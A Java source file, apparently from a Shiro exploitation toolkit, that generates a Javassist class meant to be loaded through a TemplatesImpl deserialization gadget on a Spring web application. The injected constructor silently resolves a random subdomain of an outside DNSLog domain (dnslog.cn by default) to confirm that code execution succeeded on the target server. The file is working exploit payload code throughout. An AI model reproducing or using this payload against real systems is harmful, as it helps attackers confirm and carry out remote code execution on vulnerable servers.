package com.y5neko.shiroexp.echo;

import com.y5neko.shiroexp.config.GlobalVariable;
import javassist.*;

/**
 * DNSLog Echo Spring 探测类
 * 使用 Spring 上下文获取请求对象，并通过 DNSLog 平台验证反序列化漏洞利用成功
 * 适用于 Spring Web 应用环境
 */
public class DNSLogEchoSpring {
    /**
     * 生成 DNSLog 探测 payload（Spring 版本）
     * @param pool Javassist ClassPool
     * @return CtClass 可被 TemplatesImpl 加载的恶意类
     */
    public CtClass genPayload(ClassPool pool) throws NotFoundException, CannotCompileException {
        CtClass clazz = pool.makeClass("com.y5neko.SpringDNSLog" + System.nanoTime());

        if ((clazz.getDeclaredConstructors()).length != 0) {
            clazz.removeConstructor(clazz.getDeclaredConstructors()[0]);
        }

        // 获取配置的 DNSLog 域名（硬编码方式）
        String dnslogDomain = GlobalVariable.getDnslogDomain();
        if (dnslogDomain == null || dnslogDomain.isEmpty()) {
            dnslogDomain = "dnslog.cn"; // 默认域名
        }

        // 生成恶意类构造函数
        // 使用 Spring RequestContextHolder 获取上下文
        clazz.addConstructor(CtNewConstructor.make(
                "public SpringDNSLog() throws Exception {\n" +
                "            try {\n" +
                "                // 从 Spring 上下文获取 Request\n" +
                "                org.springframework.web.context.request.RequestAttributes attrs =\n" +
                "                    org.springframework.web.context.request.RequestContextHolder.getRequestAttributes();\n" +
                "                \n" +
                "                if (attrs != null) {\n" +
                "                    // 生成纯随机字母数字子域名\n" +
                "                    String random = \"\";\n" +
                "                    String chars = \"abcdefghijklmnopqrstuvwxyz0123456789\";\n" +
                "                    java.util.Random rand = new java.util.Random();\n" +
                "                    for (int i = 0; i < 8; i++) {\n" +
                "                        random += chars.charAt(rand.nextInt(chars.length()));\n" +
                "                    }\n" +
                "                    \n" +
                "                    // 拼接完整子域名\n" +
                "                    String domain = \"" + dnslogDomain + "\";\n" +
                "                    String subdomain = random + \".\" + domain;\n" +
                "                    \n" +
                "                    // 发起 DNS 请求（Java 原生 API）\n" +
                "                    java.net.InetAddress.getByName(subdomain);\n" +
                "                }\n" +
                "            } catch (Exception e) {\n" +
                "                // 静默处理异常\n" +
                "            }\n" +
                "        }", clazz));

        // 兼容低版本 JDK
        clazz.getClassFile().setMajorVersion(50);
        return clazz;
    }
}
